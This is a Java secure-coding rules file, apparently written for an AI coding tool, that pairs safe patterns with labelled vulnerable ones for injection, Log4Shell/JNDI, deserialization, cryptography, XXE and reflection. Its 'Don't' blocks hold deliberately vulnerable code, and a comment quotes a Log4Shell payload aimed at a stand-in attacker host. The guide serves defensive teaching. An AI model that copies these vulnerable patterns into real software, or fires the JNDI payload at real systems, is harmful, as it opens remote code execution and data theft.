# Java Security Rules

Security rules for Java development in Claude Code. Baseline: Java 21 LTS.

## Prerequisites

- `rules/_core/owasp-2025.md` - Core web security

---

## Injection Prevention

### Rule: Use Parameterized Queries

**Level**: `strict`

**When**: Executing database queries.

**Do**:
```java
// PreparedStatement
public User getUser(String email) throws SQLException {
    String sql = "SELECT * FROM users WHERE email = ?";
    try (PreparedStatement stmt = connection.prepareStatement(sql)) {
        stmt.setString(1, email);
        ResultSet rs = stmt.executeQuery();
        // Process results
    }
}

// JPA/Hibernate
@Query("SELECT u FROM User u WHERE u.email = :email")
User findByEmail(@Param("email") String email);

// Criteria API
CriteriaBuilder cb = em.getCriteriaBuilder();
CriteriaQuery<User> query = cb.createQuery(User.class);
Root<User> root = query.from(User.class);
query.where(cb.equal(root.get("email"), email));
```

**Don't**:
```java
// VULNERABLE: SQL injection
String sql = "SELECT * FROM users WHERE email = '" + email + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(sql);

// VULNERABLE: String concatenation in JPQL
String jpql = "SELECT u FROM User u WHERE u.email = '" + email + "'";
em.createQuery(jpql);
```

**Why**: SQL injection allows attackers to read, modify, or delete database data.

**Refs**: CWE-89, OWASP A03:2025

---

### Rule: Prevent Command Injection

**Level**: `strict`

**When**: Executing system commands.

**Do**:
```java
public String listFiles(String directory) throws IOException {
    // Validate input
    if (directory.contains("..") || directory.contains(";")) {
        throw new IllegalArgumentException("Invalid directory");
    }

    // Use ProcessBuilder with argument list
    ProcessBuilder pb = new ProcessBuilder("ls", "-la", directory);
    pb.redirectErrorStream(true);
    Process process = pb.start();

    try (BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream()))) {
        return reader.lines().collect(Collectors.joining("\n"));
    }
}
```

**Don't**:
```java
// VULNERABLE: Command injection
Runtime.getRuntime().exec("ls -la " + userInput);

// VULNERABLE: Shell interpretation
Runtime.getRuntime().exec(new String[]{"sh", "-c", "ls " + userInput});
```

**Why**: Shell metacharacters allow executing arbitrary commands.

**Refs**: CWE-78, OWASP A03:2025

---

### Rule: Prevent JNDI Injection

**Level**: `strict`

**When**: Any code path that constructs a JNDI name or URL from external input, including
logging frameworks that interpolate message patterns (Log4j2 `%m`, `${...}` lookups).

**Do**:
```java
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.Set;

// Allowlist every JNDI name the application legitimately needs at startup.
// Resolve names only from this set; never accept caller-supplied names.
private static final Set<String> ALLOWED_JNDI_NAMES = Set.of(
    "java:comp/env/jdbc/AppDS",
    "java:comp/env/mail/Session"
);

public Object lookupResource(String name) throws NamingException {
    if (!ALLOWED_JNDI_NAMES.contains(name)) {
        throw new SecurityException("JNDI lookup blocked for name: " + name);
    }
    return new InitialContext().lookup(name);
}
```

For logging configuration (Log4j2 2.17.1+):

```xml
<!-- log4j2.xml: disable all message lookups -->
<Configuration status="WARN">
  <Properties>
    <!-- Equivalent to -Dlog4j2.formatMsgNoLookups=true for all appenders -->
    <Property name="log4j2.formatMsgNoLookups">true</Property>
  </Properties>
  ...
</Configuration>
```

JVM startup flag alternative (all Log4j2 versions):

```
-Dlog4j2.formatMsgNoLookups=true
```

If Log4j2 is on the classpath and must handle untrusted messages, upgrade to **2.17.1 or later**
and set `formatMsgNoLookups=true`. Log4j2 2.17.1 disables JNDI lookups by default.

**Don't**:
```java
// VULNERABLE: CVE-2021-44228 (Log4Shell) — attacker supplies "${jndi:ldap://attacker.com/x}"
// and Log4j2 performs the JNDI lookup, executing attacker-controlled code.
logger.info("User login: " + userSuppliedInput);  // with Log4j2 < 2.17.1

// VULNERABLE: Direct untrusted lookup — attacker supplies an LDAP or RMI URL.
public Object lookup(String userSuppliedName) throws NamingException {
    return new InitialContext().lookup(userSuppliedName);
}

// VULNERABLE: Untrusted name passed to directory context.
DirContext ctx = new InitialDirContext();
ctx.lookup(request.getParameter("resource"));
```

**Why**: JNDI allows loading remote class definitions via LDAP/RMI/CORBA URLs. When an
attacker controls the JNDI name, they can redirect the lookup to a server that returns a
malicious class, achieving remote code execution. Log4Shell (CVE-2021-44228) exploited this
through Log4j2's message interpolation. CWE-917 (Improper Neutralization of Special Elements
used in an Expression Language Statement).

**Refs**: CWE-917, CWE-74, OWASP A03:2025, CVE-2021-44228

---

## Serialization

### Rule: Avoid Unsafe Deserialization

**Level**: `strict`

**When**: Deserializing external data.

**Do**:
```java
// Use JSON instead of Java serialization
// Caution: never call mapper.enableDefaultTyping() or
// mapper.activateDefaultTyping() — those reintroduce gadget chain risk.
ObjectMapper mapper = new ObjectMapper();
User user = mapper.readValue(jsonString, User.class);

// If Java serialization is required, use an allowlist filter (Java 17+)
ObjectInputStream ois = new ObjectInputStream(inputStream) {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException("Unauthorized class: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
};

// Or use serialization filters (Java 9+, recommended on Java 17+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.model.*;!*"
);
ois.setObjectInputFilter(filter);
```

**Don't**:
```java
// VULNERABLE: Arbitrary code execution
ObjectInputStream ois = new ObjectInputStream(untrustedInput);
Object obj = ois.readObject();
```

**Why**: Java deserialization can execute arbitrary code via gadget chains.

**Refs**: CWE-502, OWASP A08:2025

---

## Cryptography

### Rule: Use Strong Cryptographic Algorithms

**Level**: `strict`

**When**: Encrypting data or hashing passwords.

**Do**:
```java
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.security.SecureRandom;

// Secure random
SecureRandom random = new SecureRandom();
byte[] token = new byte[32];
random.nextBytes(token);

// AES encryption
KeyGenerator keyGen = KeyGenerator.getInstance("AES");
keyGen.init(256);
SecretKey key = keyGen.generateKey();
Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
cipher.init(Cipher.ENCRYPT_MODE, key);

// Password hashing with BCrypt
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
String hash = encoder.encode(password);
boolean matches = encoder.matches(password, hash);
```

**Don't**:
```java
// VULNERABLE: Weak algorithms
Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
MessageDigest md = MessageDigest.getInstance("MD5");

// VULNERABLE: Predictable random
Random random = new Random();
int token = random.nextInt();
```

**Why**: Weak cryptography allows attackers to decrypt data or crack passwords.

**Refs**: CWE-327, CWE-328, CWE-330

---

## Path Traversal

### Rule: Validate File Paths

**Level**: `strict`

**When**: Accessing files based on user input.

**Do**:
```java
import java.nio.file.Path;
import java.nio.file.Paths;

public File safeGetFile(String filename) throws SecurityException {
    Path basePath = Paths.get("/app/uploads").toAbsolutePath().normalize();
    Path requestedPath = basePath.resolve(filename).normalize();

    // Ensure path is within base directory
    if (!requestedPath.startsWith(basePath)) {
        throw new SecurityException("Path traversal attempt detected");
    }

    return requestedPath.toFile();
}
```

**Don't**:
```java
// VULNERABLE: Path traversal
public File getFile(String filename) {
    return new File("/app/uploads/" + filename);
}
```

**Why**: Path traversal allows reading sensitive files like /etc/passwd or config files.

**Refs**: CWE-22, OWASP A01:2025

---

## XML Processing

### Rule: Prevent XXE Attacks

**Level**: `strict`

**When**: Parsing XML from external sources.

**Do**:
```java
import javax.xml.parsers.DocumentBuilderFactory;

DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// Disable external entities
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(inputStream);
```

**Don't**:
```java
// VULNERABLE: XXE attack
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(untrustedInput);  // Default allows XXE
```

**Why**: XXE allows reading local files, SSRF, and denial of service.

**Refs**: CWE-611, OWASP A05:2025

---

## Error Handling

### Rule: Don't Expose Stack Traces

**Level**: `warning`

**When**: Handling exceptions.

**Do**:
```java
@ControllerAdvice
public class GlobalExceptionHandler {

    private static final Logger logger = LoggerFactory.getLogger(GlobalExceptionHandler.class);

    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleException(Exception ex) {
        // Log full details internally
        logger.error("Unhandled exception", ex);

        // Return safe message to client
        return ResponseEntity
            .status(HttpStatus.INTERNAL_SERVER_ERROR)
            .body(new ErrorResponse("Internal server error"));
    }

    @ExceptionHandler(ValidationException.class)
    public ResponseEntity<ErrorResponse> handleValidation(ValidationException ex) {
        return ResponseEntity
            .status(HttpStatus.BAD_REQUEST)
            .body(new ErrorResponse("Invalid input"));
    }
}
```

**Don't**:
```java
// VULNERABLE: Exposes stack trace
@ExceptionHandler(Exception.class)
public ResponseEntity<String> handleException(Exception ex) {
    StringWriter sw = new StringWriter();
    ex.printStackTrace(new PrintWriter(sw));
    return ResponseEntity.status(500).body(sw.toString());
}
```

**Why**: Stack traces reveal internal paths, library versions, and code structure.

**Refs**: CWE-209, OWASP A05:2025

---

## Input Validation

### Rule: Validate All External Input

**Level**: `strict`

**When**: Processing user input.

**Do**:
```java
// Spring Boot 3.x uses jakarta.* (Jakarta EE 9+).
// Spring Boot 2.x uses javax.validation.constraints.*
import jakarta.validation.constraints.*;

public class UserDTO {
    @NotNull
    @Email
    private String email;

    @NotNull
    @Size(min = 8, max = 128)
    private String password;

    @Min(0)
    @Max(150)
    private Integer age;
}

@PostMapping("/users")
public ResponseEntity<User> createUser(@Valid @RequestBody UserDTO dto) {
    // dto is validated
    return ResponseEntity.ok(userService.create(dto));
}
```

**Don't**:
```java
// VULNERABLE: No validation
@PostMapping("/users")
public ResponseEntity<User> createUser(@RequestBody UserDTO dto) {
    return ResponseEntity.ok(userService.create(dto));
}
```

**Why**: Unvalidated input enables injection attacks and business logic bypass.

**Refs**: CWE-20, OWASP A03:2025

---

## Reflection

### Rule: Do Not Call setAccessible(true) Across Security Boundaries

**Level**: `strict`

**When**: Using the Java Reflection API (`java.lang.reflect`) or `java.lang.invoke` to
access fields or methods, especially on classes you do not own.

**Do**:
```java
import java.lang.reflect.Field;
import java.lang.reflect.InaccessibleObjectException;

// Check module access before attempting reflection on foreign classes.
// Module.canAccess() is the Java 9+ preferred guard.
public Object readField(Object target, Field field) throws IllegalAccessException {
    if (!field.canAccess(target)) {
        // Refuse rather than force access.
        throw new SecurityException(
            "Reflective access denied for field: " + field.getName()
        );
    }
    return field.get(target);
}

// Prefer accessing only your own module's internals; declare opens in module-info
// when cross-module reflection is genuinely required:
//   module com.myapp {
//       opens com.myapp.internal to com.trusted.framework;
//   }
```

**Don't**:
```java
import java.lang.reflect.Field;

// VULNERABLE: Forces access to private/protected members, bypassing encapsulation.
// An attacker who controls 'fieldName' can read or overwrite any field,
// including security-relevant ones (credentials, session tokens, policy objects).
public Object readAnyField(Object target, String fieldName)
        throws NoSuchFieldException, IllegalAccessException {
    Field field = target.getClass().getDeclaredField(fieldName);
    field.setAccessible(true);  // bypasses module boundary checks
    return field.get(target);
}

// VULNERABLE: setAccessible on a caller-supplied Class is an open door.
public void injectValue(Class<?> clazz, String fieldName, Object value)
        throws Exception {
    Field f = clazz.getDeclaredField(fieldName);
    f.setAccessible(true);
    f.set(null, value);  // can overwrite static security state
}
```

**Why**: `setAccessible(true)` suppresses Java's access control checks, including the
strong encapsulation enforced by the Java Platform Module System (JPMS) in Java 9+
and tightened further in Java 17+. An attacker who controls the class or field name
argument can read secret material, overwrite security policy objects, or invoke
internal methods that bypass authorization logic. CWE-470 (Use of Externally-Controlled
Input to Select Classes or Code) applies when the class or member name comes from
external input.

**Refs**: CWE-470, CWE-284, OWASP A01:2025

---

## Streams

### Rule: Use Terminal Operations Only on Bounded Sources

**Level**: `warning`

**When**: Building Java Streams from external or network-sourced data, or using
`forEach` with side effects, or using `parallelStream` with shared mutable state.

**Do**:
```java
import java.util.stream.Stream;
import java.util.List;

// Apply .limit() before any terminal operation on a source whose size is
// not statically known (e.g., lines from a socket, database cursor, file).
public List<String> safeReadLines(Stream<String> incoming) {
    return incoming
        .limit(10_000)          // cap before any work is done
        .filter(s -> !s.isBlank())
        .toList();
}

// Use collect/reduce/findFirst instead of forEach when the result matters:
// forEach silently swallows checked exceptions and makes short-circuiting harder.
public Optional<String> firstMatch(List<String> items, String prefix) {
    return items.stream()
        .filter(s -> s.startsWith(prefix))
        .findFirst();           // short-circuits; no unnecessary iteration
}

// When using parallelStream, confine state to thread-local or use collectors:
public long countDistinct(List<String> items) {
    return items.parallelStream()
        .distinct()
        .count();               // stateless intermediate; safe for parallel
}
```

**Don't**:
```java
import java.util.ArrayList;
import java.util.List;
import java.util.stream.Stream;

// VULNERABLE: unbounded terminal on untrusted source causes OOM / resource exhaustion
public List<String> readAllLines(Stream<String> networkLines) {
    return networkLines.toList();  // no limit — attacker sends infinite stream
}

// RISKY: forEach with shared mutable state causes data races in parallelStream
List<String> results = new ArrayList<>();
items.parallelStream().forEach(results::add);  // ArrayList is not thread-safe

// RISKY: forEach swallows exceptions and hides failures
items.forEach(item -> {
    try {
        process(item);
    } catch (IOException e) {
        // silently ignored — no propagation possible from Consumer
    }
});
```

**Why**: Streams are lazy by design; a terminal operation on an unbounded source will
consume memory proportional to source size. Without `.limit()`, an attacker-controlled
stream (e.g., from a file upload, socket, or database cursor with no query limit) can
exhaust heap and cause denial of service. Shared mutable state in `parallelStream`
pipelines causes data races because `ArrayList` and similar collections are not
thread-safe. CWE-400 (Uncontrolled Resource Consumption) and CWE-770 (Allocation of
Resources Without Limits or Throttling) apply to the unbounded-source pattern.

**Refs**: CWE-400, CWE-770, OWASP A05:2025

---

## Quick Reference

| Rule | Level | CWE |
|------|-------|-----|
| Parameterized queries | strict | CWE-89 |
| No command injection | strict | CWE-78 |
| No JNDI injection | strict | CWE-917 |
| Safe deserialization | strict | CWE-502 |
| Strong cryptography | strict | CWE-327 |
| Path traversal prevention | strict | CWE-22 |
| XXE prevention | strict | CWE-611 |
| Safe error handling | warning | CWE-209 |
| Input validation | strict | CWE-20 |
| No setAccessible bypass | strict | CWE-470 |
| Bounded stream operations | warning | CWE-400 |

---

## Version History

- **v2.0.0** - Java 21 LTS baseline; added JNDI injection, reflection, and streams rules; fixed jakarta.* import namespace
- **v1.0.0** - Initial Java security rules
